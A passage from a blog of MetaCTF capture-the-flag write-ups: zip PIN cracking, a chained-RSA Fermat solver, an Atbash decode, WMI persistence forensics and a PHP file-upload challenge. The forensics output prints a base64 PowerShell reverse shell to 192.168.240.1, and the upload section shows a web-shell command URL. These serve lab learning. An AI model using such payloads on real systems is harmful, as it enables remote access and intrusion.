<li><p>The application does not validate or sanitize input, so malicious input could manipulate the SQL query to bypass authentication.</p>
</li>
</ul>
<p><img src="/img/metactfimage18.png" alt="image.png"></p>
<p><img src="/img/metactfimage19.png" alt="image.png"></p>
<hr>
<p>I need to get into this <a target="_blank" rel="noopener" href="https://metaproblems.com/d36b89698928224c03f29aa2d2cb5544/luggage.zip">archive</a>, but I forgot the password for it as well. All I remember is, it’s the same 4-digit pin I used on my luggage lock…</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌─[root@parrot]─[/home/kali/Desktop]</span><br><span class="line">└──╼ <span class="comment">#fcrackzip -v -D -u -p /usr/share/wordlists/rockyou.txt luggage.zip </span></span><br><span class="line">found file <span class="string">&#x27;flag.txt&#x27;</span>, (size <span class="built_in">cp</span>/uc     68/    56, flags 1, chk f38c)</span><br><span class="line">                        </span><br><span class="line">PASSWORD FOUND!!!!: pw == 7123</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/metactfimage20.png" alt="image.png"></p>
<hr>
<p>What’s better than RSA? 1024 runs of RSA!</p>
<p>We encrypted the flag using <a target="_blank" rel="noopener" href="https://metaproblems.com/b7efc6dbe8b30f0d5d1a1f333297fbda/loopy_primes.py">this program</a>, and the output from running the program with the <a target="_blank" rel="noopener" href="https://metaproblems.com/b7efc6dbe8b30f0d5d1a1f333297fbda/output.txt">flag</a> is available here.</p>
<p>Can you figure out what the original flag was?</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from secrets import FLAG</span><br><span class="line">from Crypto.Util.number import bytes_to_long, getPrime</span><br><span class="line">from sympy import nextprime </span><br><span class="line"></span><br><span class="line">E = 65537</span><br><span class="line">LOOPS = 1024</span><br><span class="line">keysize = 512</span><br><span class="line">pt = bytes_to_long(FLAG)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,LOOPS):</span><br><span class="line">    <span class="comment">#print(f&quot;pt &#123;i&#125;: &#123;pt&#125;&quot;)</span></span><br><span class="line">    p = getPrime(keysize)</span><br><span class="line">    q = nextprime(p)</span><br><span class="line">    n = p*q</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&quot;n &#123;i&#125;: &#123;n&#125;&quot;</span>)    </span><br><span class="line">    ct = pow(pt, E, n)</span><br><span class="line">    pt = ct</span><br><span class="line">    keysize+=1</span><br><span class="line">    <span class="keyword">if</span> i == LOOPS - 1:</span><br><span class="line">        <span class="built_in">print</span>(f<span class="string">&quot;ct &#123;i&#125;: &#123;ct&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">n 0: 58925408247237150718853020288660614964885937087443374494748117153321454897494106350365153437207431995046188449566482398926564680325766021705291969671142407537893105626964976326911173444535099436796060713319386867699316931662339127118126085249539191718287895359339838418358971997170530525806189319780925594989</span><br><span class="line">n 1: 420074976683378657854469830084952452166331743473055570014564677217278678109354411673745923344406469209476033895602263472721449067395081686757235932197766820144127698660254630004481280733415500804393235136927892534076667879707641538667404654805572048375580943632117170785312674084495314753014227063390393253971</span><br><span class="line">n 2: 1559230717146436704258126658878594303835854678919760985172436714506910746263901891106710743493961990464628191090502846776956568264866565700228335235919370966430208637927737297040638052365863727774078564524547976902060128879221804567894768562590230275602281461418831077416735526836794895469692918002247920633673</span><br><span class="line">...</span><br><span class="line">n 1023: 1267919874988366294824754036502102253839007260324431994159563506150527737933721534242973396801528291782062435156001060576106259511187851542673154260334449420573811437511601222626257814850849868036401038254780655406667342662783075675279348081527412407589891876965829954443294919002205278574238340766902606903158754281519494495397829601214540036573007092747269897782321207910274243316347055831965232371918023374086760818426747875311906362251077679481154945695895158664896692153216729025599558239510433848932913871051008234150319960025234545082490863672396770851851918839344920597177301535559330640371198784781384359811154106580798863751965711939656904877044064901234472152935884199640782746451197646516806025000456914468223373262814803272461933323590514938198921544799815384261380125390232828732845529684619654493045148743805154302299521722285312469243036133945037149086165761003738705967996780136020932374602666380997736858769</span><br><span class="line"></span><br><span class="line">ct 1023: 1250021393696525786335144361256414392593842741899479026585356065981817277181288068914492467448549175876062630331679179355487465372606959563984767504620720255739774332272265642671917705941701114225469036166567594052827968764499243560382703470425820431311019975034026645239723973080187014930125726065276819489811844274205868050933689117304876596915537920549094830768541674984384367985548037483091618223908344579452561631433297832894343244227860114298682044575901262345754528530201542566101805629757559712992093692264025791932530650085361520370720560897345946878375718294804530566609217693927191949845442274139788083823261127745109253437341146676011790218622001363252912102009978815070618838677527704373445935401007981220691357785265074004747715150454051491489944469565489921680045495525795924651018931270447789984693706499550173787891272109393797400115911729509755305600161994934603465525212582074265397044150982115224461467939</span><br></pre></td></tr></table></figure>

<p>需要先把n,ct從網站提取出來</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">URL = <span class="string">&quot;https://metaproblems.com/b7efc6dbe8b30f0d5d1a1f333297fbda/output.txt&quot;</span></span><br><span class="line">OUTPUT_FILE = <span class="string">&quot;output_data.txt&quot;</span></span><br><span class="line"></span><br><span class="line">def fetch_data(url):</span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == 200:</span><br><span class="line">        <span class="built_in">return</span> response.text</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span> None</span><br><span class="line"></span><br><span class="line">def extract_n_and_ct(data):</span><br><span class="line">    n_pattern = re.compile(r<span class="string">&quot;n \d+: (\d+)&quot;</span>)</span><br><span class="line">    ct_pattern = re.compile(r<span class="string">&quot;ct \d+: (\d+)&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    n_values = n_pattern.findall(data)</span><br><span class="line">    ct_values = ct_pattern.findall(data)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">return</span> n_values, ct_values</span><br><span class="line"></span><br><span class="line">def save_to_file(n_values, ct_values, filename):</span><br><span class="line">    with open(filename, <span class="string">&quot;w&quot;</span>) as f:</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> n_values:</span><br><span class="line">            f.write(f<span class="string">&quot;&#123;n&#125;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> ct <span class="keyword">in</span> ct_values:</span><br><span class="line">            f.write(f<span class="string">&quot;&#123;ct&#125;\n&quot;</span>) </span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    data = fetch_data(URL)</span><br><span class="line">    <span class="keyword">if</span> not data:</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line">    n_values, ct_values = extract_n_and_ct(data)</span><br><span class="line">    save_to_file(n_values, ct_values, OUTPUT_FILE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="RSA-Encryption-and-Decryption-Process"><a href="#RSA-Encryption-and-Decryption-Process" class="headerlink" title="RSA Encryption and Decryption Process:"></a>RSA Encryption and Decryption Process:</h3><ol>
<li><p><strong>RSA Setup:</strong></p>
<ul>
<li><strong>Public Key</strong>: The public key is composed of two parts: <code>E</code> (the exponent) and <code>n</code> (the modulus, which is the product of two large prime numbers <code>p</code> and <code>q</code>).</li>
<li><strong>Private Key</strong>: The private key is <code>d</code> (the private exponent), computed using Euler’s Totient Function <code>φ(n)</code>, where <code>φ(n) = (p - 1) * (q - 1)</code>.</li>
</ul>
</li>
<li><p><strong>Encryption:</strong></p>
<ul>
<li><p>To encrypt the message (which is the flag in this case), the plaintext message is first converted into an integer <code>pt</code>.</p>
</li>
<li><p>The encryption is then done using the formula:</p>
<p><strong>Ciphertext</strong> (<code>ct</code>) &#x3D; <code>pt^E % n</code></p>
<p>Here, <code>E</code> is a fixed public exponent (commonly <code>65537</code>), and <code>n</code> is the product of two large primes <code>p</code> and <code>q</code>.</p>
</li>
</ul>
</li>
<li><p><strong>Decryption:</strong></p>
<ul>
<li><p>To decrypt, the private exponent <code>d</code> is required. It’s computed as the modular inverse of <code>E</code> modulo <code>φ(n)</code>:</p>
<p><strong>Private exponent</strong> (<code>d</code>) &#x3D; <code>E^-1 % φ(n)</code></p>
</li>
<li><p>The original message is recovered using the formula:</p>
<p><strong>Plaintext</strong> (<code>pt</code>) &#x3D; <code>ct^d % n</code></p>
</li>
</ul>
</li>
<li><p><strong>Multiple Encryption Steps:</strong></p>
<ul>
<li>The flag is encrypted multiple times (specifically 1024 times), with each encryption step involving a new pair of primes <code>p</code> and <code>q</code>. Each new pair generates a new <code>n</code> value.</li>
<li>In each step, the ciphertext from the previous encryption is used as the plaintext for the next encryption. This chaining process makes it more difficult to decrypt.</li>
<li>To recover the original flag, you need to reverse the process starting from the final ciphertext and work backwards, applying the private key <code>d</code> in each step to eventually retrieve the original plaintext.</li>
</ul>
</li>
</ol>
<h3 id="Key-Observations"><a href="#Key-Observations" class="headerlink" title="Key Observations:"></a><strong>Key Observations:</strong></h3><ol>
<li><p><strong>Each <code>n</code> is the product of two primes, <code>p</code> and <code>q</code></strong>, and these are different for each encryption step.</p>
<p> However, unlike traditional RSA, the primes aren’t chosen randomly each time. They are close enough to each other that certain factoring techniques can work.</p>
</li>
<li><p><strong>Each step only needs to “undo” the encryption from the previous step</strong>. This is where the main challenge lies. You have to find the right way to reverse each encryption process.</p>
</li>
</ol>
<h3 id="The-Attack-Process"><a href="#The-Attack-Process" class="headerlink" title="The Attack Process:"></a><strong>The Attack Process</strong>:</h3><p>Here’s a rephrased explanation of the process to reverse the RSA encryption chain, formatted for better compatibility with your Hexo site:</p>
<hr>
<h3 id="Reversing-the-RSA-Encryption-Chain"><a href="#Reversing-the-RSA-Encryption-Chain" class="headerlink" title="Reversing the RSA Encryption Chain:"></a>Reversing the RSA Encryption Chain:</h3><p>To recover the original flag, we need to reverse the encryption process, which involves the following steps:</p>
<ol>
<li><p><strong>Extract the Moduli (<code>n</code>)</strong>:</p>
<ul>
<li>The challenge provides a list of the moduli <code>n</code> used during each encryption step (found in <code>output_data.txt</code>). These moduli are the result of multiplying two prime numbers <code>p</code> and <code>q</code>.</li>
</ul>
</li>
<li><p><strong>Factorizing <code>n</code></strong>:</p>
<ul>
<li><p>In traditional RSA, factoring <code>n</code> into its prime factors <code>p</code> and <code>q</code> is computationally difficult. However, because the primes <code>p</code> and <code>q</code> are chosen to be close to each other, we can use <strong>Fermat’s Factorization Method</strong> to efficiently factor <code>n</code>. This method is based on the difference of squares formula:</p>
<p><code>n = (a + b)(a - b)</code></p>
<p>Here, <code>a</code> and <code>b</code> are integers derived from <code>n</code>.</p>
</li>
</ul>
</li>
<li><p><strong>Reversing the Encryption</strong>:</p>
<ul>
<li><p>Once we have factored <code>n</code> into <code>p</code> and <code>q</code>, we can calculate the Euler’s Totient Function <code>φ(n)</code> using the formula:</p>
<p><code>φ(n) = (p - 1) * (q - 1)</code></p>
</li>
<li><p>Then, we calculate the private key exponent <code>d</code> by finding the modular inverse of <code>E</code> (the public exponent) modulo <code>φ(n)</code>:</p>
<p><code>d = E^-1 mod φ(n)</code></p>
</li>
<li><p>With the private key <code>d</code>, we can decrypt the ciphertext at each step using the formula:</p>
<p><code>ct = ct^d mod n</code></p>
<p>This will recover the plaintext for that encryption step, which is then passed as the ciphertext to the next decryption step. We continue this process for all 1024 encryption steps, progressively recovering the original plaintext.</p>
</li>
</ul>
</li>
<li><p><strong>Recovering the Flag</strong>:</p>
<ul>
<li>By applying the decryption steps in reverse order, we eventually recover the original plaintext, which is the flag.</li>
</ul>
</li>
</ol>
<h3 id="Code-Implementation-Steps"><a href="#Code-Implementation-Steps" class="headerlink" title="Code Implementation Steps:"></a><strong>Code Implementation Steps</strong>:</h3><ol>
<li><p><strong>Load the Moduli (<code>n</code>)</strong>: Extract the moduli used in the RSA encryptions from <code>output_data.txt</code>. The moduli are stored as integers.</p>
</li>
<li><p><strong>Factor Each Modulus <code>n</code></strong>: Apply Fermat’s Factorization method to break each <code>n</code> into its prime factors <code>p</code> and <code>q</code>.</p>
</li>
<li><p><strong>Calculate <code>φ(n)</code></strong>: After extracting <code>p</code> and <code>q</code> from <code>n</code>, compute the Euler’s Totient Function <code>φ(n)</code> using the formula <code>φ(n) = (p - 1) * (q - 1)</code>.</p>
</li>
<li><p><strong>Compute the Private Exponent <code>d</code></strong>: Using <code>φ(n)</code>, calculate the modular inverse of <code>E</code> to obtain the private exponent <code>d</code>.</p>
</li>
<li><p><strong>Decrypt Each Step</strong>: Start with the final ciphertext and apply the RSA decryption formula <code>ct = ct^d mod n</code> for each encryption step, working backward through all the steps.</p>
</li>
<li><p><strong>Recover the Flag</strong>: After completing all the decryption steps, convert the final plaintext to bytes, revealing the flag.</p>
</li>
</ol>
<p>最後腳本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import inverse, long_to_bytes</span><br><span class="line">from gmpy2 import isqrt, gcd</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">E = 65537</span><br><span class="line">OUTPUT_FILE = <span class="string">&quot;output_data.txt&quot;</span></span><br><span class="line"></span><br><span class="line">final_ct = 1250021393696525786335144361256414392593842741899479026585356065981817277181288068914492467448549175876062630331679179355487465372606959563984767504620720255739774332272265642671917705941701114225469036166567594052827968764499243560382703470425820431311019975034026645239723973080187014930125726065276819489811844274205868050933689117304876596915537920549094830768541674984384367985548037483091618223908344579452561631433297832894343244227860114298682044575901262345754528530201542566101805629757559712992093692264025791932530650085361520370720560897345946878375718294804530566609217693927191949845442274139788083823261127745109253437341146676011790218622001363252912102009978815070618838677527704373445935401007981220691357785265074004747715150454051491489944469565489921680045495525795924651018931270447789984693706499550173787891272109393797400115911729509755305600161994934603465525212582074265397044150982115224461467939</span><br><span class="line"></span><br><span class="line">def load_moduli(filename):</span><br><span class="line">    with open(filename, <span class="string">&quot;r&quot;</span>) as f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    n_values = re.findall(r<span class="string">&quot;\d+&quot;</span>, data)</span><br><span class="line">    moduli = [int(n) <span class="keyword">for</span> n <span class="keyword">in</span> n_values]</span><br><span class="line">    <span class="built_in">return</span> moduli</span><br><span class="line"></span><br><span class="line">def fermat_factorization(n):</span><br><span class="line">    a = isqrt(n) + 1</span><br><span class="line">    b2 = a * a - n</span><br><span class="line">    <span class="keyword">while</span> not isqrt(b2)**2 == b2:</span><br><span class="line">        a += 1</span><br><span class="line">        b2 = a * a - n</span><br><span class="line">    b = isqrt(b2)</span><br><span class="line">    p = a + b</span><br><span class="line">    q = a - b</span><br><span class="line">    assert p * q == n, <span class="string">&quot;Fermat factorization failed&quot;</span></span><br><span class="line">    <span class="built_in">return</span> p, q</span><br><span class="line"></span><br><span class="line">def iterative_decrypt(final_ct, moduli, E):</span><br><span class="line">    ct = final_ct</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> reversed(range(len(moduli))):</span><br><span class="line">        n = moduli[i]</span><br><span class="line">        p, q = fermat_factorization(n)</span><br><span class="line">        phi = (p - 1) * (q - 1)</span><br><span class="line">        d = inverse(E, phi)</span><br><span class="line">        ct = pow(ct, d, n) </span><br><span class="line">    <span class="built_in">return</span> ct</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    moduli = load_moduli(OUTPUT_FILE)</span><br><span class="line">    recovered_pt = iterative_decrypt(final_ct, moduli, E)</span><br><span class="line">    flag = long_to_bytes(recovered_pt)</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&quot;Recovered FLAG: &#123;flag.decode()&#125;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>MetaCTF{g0t_d0wn_7o_7h3_root_0f_th3_lo0py_pr1mes}</p>
</blockquote>
<hr>
<p>The Federal Bureau of Elfvestigation caught this suspicious letter in the mail, can you decode it to make sure nothing nefarious is going on? Here’s a photocopy of the letter.</p>
<p><img src="/img/metactff.png" alt="metactff.png"></p>
<p><a target="_blank" rel="noopener" href="https://rumkin.com/tools/cipher/atbash/">https://rumkin.com/tools/cipher/atbash/</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Wvzi Hsrmmb Fkzgivv,</span><br><span class="line"></span><br><span class="line">Slkv blf<span class="string">&#x27;iv szermt z nviib wzb! R&#x27;</span>n <span class="built_in">rm</span> z yrg lu z hgrxpb hrgfzgrlm</span><br><span class="line">zmw xlfow ivzoob fhv blfi svok.</span><br><span class="line"></span><br><span class="line">Hl, Hftzikofn Nzib nzwv gsvhv znzarmt givzgh uli gsv luurxv</span><br><span class="line">kzigb, zmw, dvoo, R xlfowm<span class="string">&#x27;g ivhrhg. R vmwvw fk vzgrmt zoo lu gsvn!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Mld gsviv&#x27;</span>h mlgsrmt ovug uli gsv kzigb, zmw R<span class="string">&#x27;n rm z yrg lu z qzn</span></span><br><span class="line"><span class="string">(mlg fmorpv gsv uroovw wlmfgh szsz). R mvvw gl hlig gsrh lfg yvuliv</span></span><br><span class="line"><span class="string">Hftzikofn Nzib li Hzmgz urmw lfg, li gsv kzigb&#x27;</span>h tlrmt gl yv z </span><br><span class="line">wrhzhgvi.</span><br><span class="line"></span><br><span class="line">Wl blf szev zmb rwvzh li girxph fk blfi hovvev gl svok nv</span><br><span class="line">dsrk fk hlnv mvd givzgh <span class="built_in">rm</span> grnv? R pmld R xzm xlfmg lm blf gl </span><br><span class="line">pvvk gsrh yvgdvvm fh.</span><br><span class="line"></span><br><span class="line">R vmxibkgvw gsrh nvhhztv drgs zgyzhs, hl slkvufoob nb orggov</span><br><span class="line">hvxivg rh hzuv.</span><br><span class="line"></span><br><span class="line">Gszmph z glm uli yvrmt hfxs z tivzg uirvmw. R ldv blf lmv!</span><br><span class="line"></span><br><span class="line">Xsvvih,</span><br><span class="line">Yfhsb Vevitivvm</span><br><span class="line"></span><br><span class="line">K.H. Gszg xlwv blf dviv zhprmt zylfg gl fmolxp gsv wvevolknvmg nlwv </span><br><span class="line">uli gsv Nztrxzo Rmufhrlm Nzxsrmv, N2C24 rh </span><br><span class="line">NvgzXGU&#123;ylgs_givzgh_zmw_nvhhztvh_hglovm&#125;, slkv gszg svokh!</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Dear Shinny Upatree,</span><br><span class="line"></span><br><span class="line">Hope you<span class="string">&#x27;re having a merry day! I&#x27;</span>m <span class="keyword">in</span> a bit of a sticky situation</span><br><span class="line">and could really use your <span class="built_in">help</span>.</span><br><span class="line"></span><br><span class="line">So, Sugarplum Mary made these amazing treats <span class="keyword">for</span> the office</span><br><span class="line">party, and, well, I couldn<span class="string">&#x27;t resist. I ended up eating all of them!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Now there&#x27;</span>s nothing left <span class="keyword">for</span> the party, and I<span class="string">&#x27;m in a bit of a jam</span></span><br><span class="line"><span class="string">(not unlike the filled donuts haha). I need to sort this out before</span></span><br><span class="line"><span class="string">Sugarplum Mary or Santa find out, or the party&#x27;</span>s going to be a </span><br><span class="line">disaster.</span><br><span class="line"></span><br><span class="line">Do you have any ideas or tricks up your sleeve to <span class="built_in">help</span> me</span><br><span class="line">whip up some new treats <span class="keyword">in</span> <span class="keyword">time</span>? I know I can count on you to </span><br><span class="line">keep this between us.</span><br><span class="line"></span><br><span class="line">I encrypted this message with atbash, so hopefully my little</span><br><span class="line">secret is safe.</span><br><span class="line"></span><br><span class="line">Thanks a ton <span class="keyword">for</span> being such a great friend. I owe you one!</span><br><span class="line"></span><br><span class="line">Cheers,</span><br><span class="line">Bushy Evergreen</span><br><span class="line"></span><br><span class="line">P.S. That code you were asking about to unlock the development mode </span><br><span class="line"><span class="keyword">for</span> the Magical Infusion Machine, M2X24 is </span><br><span class="line">MetaCTF&#123;both_treats_and_messages_stolen&#125;, hope that helps!</span><br></pre></td></tr></table></figure>

<hr>
<p>This Christmas, my festive joy turned into frustration. Decorations vanished, garlands moved, and cookies mysteriously disappeared. Blocking the chimney seemed like the solution, but the intrusions didn’t stop. That’s when it hit me: the thief must have created a “backchimney” — a secret passage we can’t find.</p>
<p>Can you uncover the mystery in the artifacts provided here and catch the culprit before they ruin Christmas?</p>
<p><a target="_blank" rel="noopener" href="https://github.com/davidpany/WMI_Forensics">https://github.com/davidpany/WMI_Forensics</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/Repository]</span><br><span class="line">└─# <span class="built_in">cd</span> WMI_Forensics                </span><br><span class="line">                                                                                                                                                                                   </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/Repository/WMI_Forensics]</span><br><span class="line">└─# python2 CCM_RUA_Finder.py -i ../OBJECTS.DATA -o out.xls</span><br><span class="line">                100% complete...                                                                                                                                                                                   </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/Repository/WMI_Forensics]</span><br><span class="line">└─# python2 PyWMIPersistenceFinder.py ../OBJECTS.DATA            </span><br><span class="line"></span><br><span class="line">    Enumerating FilterToConsumerBindings...</span><br><span class="line">    2 FilterToConsumerBinding(s) Found. Enumerating Filters and Consumers...</span><br><span class="line"></span><br><span class="line">    Bindings:</span><br><span class="line"></span><br><span class="line">        PowershellMemoryCapture-PowerShellProcessStarted</span><br><span class="line">            Consumer: </span><br><span class="line">                Consumer Type: CommandLineEventConsumer</span><br><span class="line">                Arguments:     powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIANAAwAC4AMQAiACwANAA5ADUAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAIgBNAGUAdABhAEMAVABGAHsAMQBfAGgANAB2ADMAXwBAAF8AYgA0AGMAawBjAGgAMQBtAG4AMwB5AF8ANABfAHkAMAB1AH0AIgAgACsAIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==</span><br><span class="line">                Consumer Name: PowershellMemoryCapture</span><br><span class="line"></span><br><span class="line">            Filter: </span><br><span class="line">                Filter name:  PowerShellProcessStarted</span><br><span class="line">                Filter Query: SELECT FileName, ProcessID FROM Win32_ModuleLoadTrace WHERE FileName LIKE <span class="string">&quot;%System.Management.Automation%.dll&quot;</span></span><br><span class="line"></span><br><span class="line">        SCM Event Log Consumer-SCM Event Log Filter</span><br><span class="line">                (Common binding based on consumer and filter names, possibly legitimate)</span><br><span class="line">            Consumer: NTEventLogEventConsumer ~ SCM Event Log Consumer ~ sid ~ Service Control Manager</span><br><span class="line"></span><br><span class="line">            Filter: </span><br><span class="line">                Filter name:  SCM Event Log Filter</span><br><span class="line">                Filter Query: <span class="keyword">select</span> * from MSFT_SCMEventLogEvent</span><br><span class="line"></span><br><span class="line">    Thanks <span class="keyword">for</span> using PyWMIPersistenceFinder! Please contact @DavidPany with questions, bugs, or suggestions.</span><br><span class="line"></span><br><span class="line">    Please review FireEye<span class="string">&#x27;s whitepaper for additional WMI persistence details:</span></span><br><span class="line"><span class="string">        https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf</span></span><br><span class="line"><span class="string">                                                                                                                                       </span></span><br></pre></td></tr></table></figure>

<p>把base64解ㄌ</p>
<p><img src="/img/metactff1.png" alt="metactff.png"></p>
<p>flag在裡面</p>
<blockquote>
<p>MetaCTF{1_h4v3_@_b4ckch1mn3y_4_y0u}</p>
</blockquote>
<p>參考這個很有幫助 <a target="_blank" rel="noopener" href="https://www.hackthebox.com/blog/perseverance-biz-ctf-2022-forensics-writeup">https://www.hackthebox.com/blog/perseverance-biz-ctf-2022-forensics-writeup</a></p>
<hr>
<p>Santa wants to spread holiday cheer, but doesn’t want to rely on other websites for photo sharing. He’s building a new website to allow children to upload their holiday photos! Maybe check it out to make sure it’s secure…</p>
<p>Download the source code for the website here.</p>
<p>Your URL is <a target="_blank" rel="noopener" href="http://l5fqfkfbfkm8.chals.mctf.io/">http://l5fqfkfbfkm8.chals.mctf.io</a></p>
<p><img src="/img/metactff2.png" alt="metactff.png"></p>
<p>檢查拿到的程式</p>
<p>在 <code>upload.php</code> 的代碼中，上傳的文件沒有進行嚴格的檢查和限制：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;metactff&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$target_file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;alert alert-success mt-3&#x27;&gt;Your photo has been uploaded!&lt;/div&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;alert alert-danger mt-3&#x27;&gt;There was an error uploading your file.&lt;/div&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>缺乏文件類型檢查</strong>：<code>$_FILES[&quot;metactff&quot;][&quot;name&quot;]</code> 直接用於生成目標文件名，並未檢查文件是否真的是圖片（如 JPEG、PNG）。</li>
<li><strong>缺乏 MIME 類型檢查</strong>：沒有驗證 <code>$_FILES[&quot;metactff&quot;][&quot;type&quot;]</code> 是否與圖片類型匹配。</li>
<li><strong>缺乏內容檢查</strong>：沒有檢查文件的內容是否為合法圖片格式，而非惡意代碼。</li>
</ul>
<p>上傳的文件被存儲在 <code>metactffs/</code> 目錄中，該目錄允許執行 PHP 文件。</p>
<ul>
<li>Web 服務器的配置允許執行 <code>metactffs/</code> 目錄中的 PHP 文件，因此上傳的惡意文件（如 <code>exp.php</code>）可以被執行。</li>
</ul>
<p>透過原始碼知道他所有文件上傳到metactffs</p>
<p>不知道flag位置沒問題，直接查找，因為上傳的exploit讓我們可以發動任意指令</p>
<p><img src="/img/metactff3.png" alt="metactff.png"></p>
<p><a target="_blank" rel="noopener" href="http://l5fqfkfbfkm8.chals.mctf.io/metactffs/exp.php?cmd=cat/var/www/html/flag.txt">http://l5fqfkfbfkm8.chals.mctf.io/metactffs/exp.php?cmd=cat /var/www/html/flag.txt</a></p>
<p><img src="/img/metactff4.png" alt="metactff.png"></p>
<blockquote>
<p>GIF89aMetaCTF{ph3ar_d3s3rial1z3d_0bj3cts} MetaCTF{ph3ar_d3s3rial1z3d_0bj3cts}</p>
</blockquote>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="Lame-Lame" class="article article-type-Lame" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Lame/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.086Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/Lame/">
        HTB_Lame
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Lame"><a href="#Lame" class="headerlink" title="Lame"></a>Lame</h1><p><a target="_blank" rel="noopener" href="https://hackmd.io/@SY-T/rkVBbdxa6">Nmap &amp; smbclient</a></p>
